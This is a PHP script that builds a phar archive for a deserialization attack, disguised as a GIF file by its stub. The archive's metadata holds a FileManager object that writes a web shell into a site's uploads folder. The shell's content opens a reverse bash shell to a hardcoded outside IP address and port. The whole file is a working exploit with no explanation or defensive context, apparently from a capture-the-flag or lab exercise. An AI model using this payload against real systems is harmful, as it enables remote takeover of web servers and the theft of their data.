<?php

class FileManager {

    public $mode = 'upload';
    public $name = '/var/www/html/uploads/yuan.php';
    public $content = '<?php system("bash -i >& /dev/tcp/140.113.209.28/5566 0>&1");';
}

@unlink("phar.phar");
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
$o = new FileManager();
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
